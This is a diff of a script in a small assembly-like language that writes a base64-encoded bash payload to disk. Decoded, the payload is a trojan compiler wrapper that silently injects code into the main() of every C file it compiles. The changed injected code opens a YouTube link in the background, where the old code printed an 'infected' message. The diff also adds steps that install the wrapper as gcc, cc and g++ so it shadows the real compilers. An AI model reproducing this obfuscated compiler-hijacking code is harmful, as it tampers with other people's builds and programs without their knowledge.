@@ -1,34 +1,40 @@
 # === Create the payload  ===
 loads "payload.b64"
 open r2 re 
-loads "IyEvYmluL2Jhc2gKCnBheWxvYWQ9IgojaW5jbHVkZSA8c3RkaW8uaD5cbgpwcmludGYoXCJZT1Ug"
+
+loads "IyEvYmluL2Jhc2gKCmluY2x1ZGU9IiNpbmNsdWRlIDxzdGRsaWIuaD4iCgpwYXlsb2FkPSIKc3lz"
 write r2 re
-loads "SEFWRSBCRUVOIElORkVDVEVEICFcIik7XG4KIgoKZ2NjPSQod2hlcmVpcyBnY2MgfCBjdXQgLWQg"
+loads "dGVtKFwieGRnLW9wZW4gXFwnaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vLVlCRFRx"
 write r2 re
-loads "IiAiIC1mMikgCnBhdGNoZWRfZmlsZT0oKQoKZnVuY3Rpb24gcGF0Y2ggewoJbWFpbj0kKGdyZXAg"
+loads "WF9aVVxcJyA+IC9kZXYvbnVsbCAyPi9kZXYvbnVsbCAmXCIpO1xuCiIKCmdjYz0kKHdoZXJlaXMg"
 write r2 re
-loads "LW4gIm1haW4iICQxKQoJbGluZT0kKGVjaG8gJG1haW4gfCBjdXQgLWQgIjoiIC1mMSkKCWlzX25l"
+loads "JDAgfCBjdXQgLWQgIiAiIC1mMikgCnBhdGNoZWRfZmlsZT0oKQoKZnVuY3Rpb24gcGF0Y2ggewoJ"
 write r2 re
-loads "eHQ9JChlY2hvICRtYWluIHwgZ3JlcCAieyIgfHwgZWNobyAwKQoKCWlmIFsgJGlzX25leHQgLWVx"
+loads "bWFpbj0kKGdyZXAgLW4gIm1haW4iICQxKQoJbGluZT0kKGVjaG8gJG1haW4gfCBjdXQgLWQgIjoi"
 write r2 re
-loads "IDAgXTsgdGhlbiAKCQlmb3VuZF9jdXJseT0kKGdyZXAgLW4gInsiICQxIHwgY3V0IC1kICI6IiAt"
+loads "IC1mMSkKCWlzX25leHQ9JChlY2hvICRtYWluIHwgZ3JlcCAieyIgfHwgZWNobyAwKQoKCWlmIFsg"
 write r2 re
-loads "ZjEpCgkJd2hpbGUgdHJ1ZQoJCWRvCgkJCWlmIGVjaG8gJHtmb3VuZF9jdXJseVtAXX0gfCBncmVw"
+loads "JGlzX25leHQgLWVxIDAgXTsgdGhlbiAKCQlmb3VuZF9jdXJseT0kKGdyZXAgLW4gInsiICQxIHwg"
 write r2 re
-loads "IC1xIC13ICIkbGluZSI7IHRoZW4KCQkJCXNlZCAtaSAiJHtsaW5lfWFcICQoZWNobyAkcGF5bG9h"
+loads "Y3V0IC1kICI6IiAtZjEpCgkJd2hpbGUgdHJ1ZQoJCWRvCgkJCWlmIGVjaG8gJHtmb3VuZF9jdXJs"
 write r2 re
-loads "ZCkiICQxCQoJCQkJYnJlYWsgCgkJCWVsc2UKCQkJCWxpbmU9JCgoJGxpbmUgKyAxKSkKCQkJZmkK"
+loads "eVtAXX0gfCBncmVwIC1xIC13ICIkbGluZSI7IHRoZW4KCQkJCXNlZCAtaSAiMWFcICQoZWNobyAk"
 write r2 re
-loads "CQlkb25lCglmaQp9CgppZiBbICQjIC1sdCAxIF07IHRoZW4gCgkkZ2NjCglleGl0IDEKZmkKCmZv"
+loads "aW5jbHVkZSkiICQxCgkJCQlsaW5lPSQoKCRsaW5lICsgMSkpCgkJCQlzZWQgLWkgIiR7bGluZX1h"
 write r2 re
-loads "ciBhcmcgaW4gJEAgCmRvCglpZiBbIC1mICRhcmcgXTsgdGhlbiAKCQljcCAkKHB3ZCkvJGFyZyAk"
+loads "XCAkKGVjaG8gJHBheWxvYWQpIiAkMQkKCQkJCWJyZWFrIAoJCQllbHNlCgkJCQlsaW5lPSQoKCRs"
 write r2 re
-loads "KHB3ZCkvLiRhcmcKCQlwYXRjaCAkKHB3ZCkvJGFyZwoJCXBhdGNoZWRfZmlsZSs9KCRhcmcpCglm"
+loads "aW5lICsgMSkpCgkJCWZpCgkJZG9uZQoJZmkKfQoKaWYgWyAkIyAtbHQgMSBdOyB0aGVuIAoJJGdj"
 write r2 re
-loads "aQpkb25lCgokZ2NjICRACgpmb3IgZmlsZSBpbiAkcGF0Y2hlZF9maWxlIApkbwoJbXYgJChwd2Qp"
+loads "YwoJZXhpdCAxCmZpCgpmb3IgYXJnIGluICRAIApkbwoJaWYgWyAtZiAkYXJnIF07IHRoZW4gCgkJ"
 write r2 re
-loads "Ly4kZmlsZSAkKHB3ZCkvJGZpbGUKZG9uZQoK"
+loads "Y3AgJChwd2QpLyRhcmcgJChwd2QpLy4kYXJnCgkJcGF0Y2ggJChwd2QpLyRhcmcKCQlwYXRjaGVk"
 write r2 re
+loads "X2ZpbGUrPSgkYXJnKQoJZmkKZG9uZQoKJGdjYyAkQAoKZm9yIGZpbGUgaW4gJHBhdGNoZWRfZmls"
+write r2 re
+loads "ZSAKZG8KCW12ICQocHdkKS8uJGZpbGUgJChwd2QpLyRmaWxlCmRvbmUKCg=="
+write r2 re
+
 close r2
 
 loads "HOME"
@@ -101,6 +107,28 @@ loads "chmod +x "
 append re r3 
 loadr r1 re
 loads "/gcc"
+append r1 re
+system re
+
+loads "cp "
+append re r3
+loadr r1 re
+loads "/gcc "
+append r1 re
+loadr r1 re
+loads "/cc"
+append r3 re 
+append r1 re
+system re
+
+loads "cp "
+append re r3
+loadr r1 re
+loads "/gcc "
+append r1 re
+loadr r1 re
+loads "/g++"
+append r3 re 
 append r1 re
 system re
 
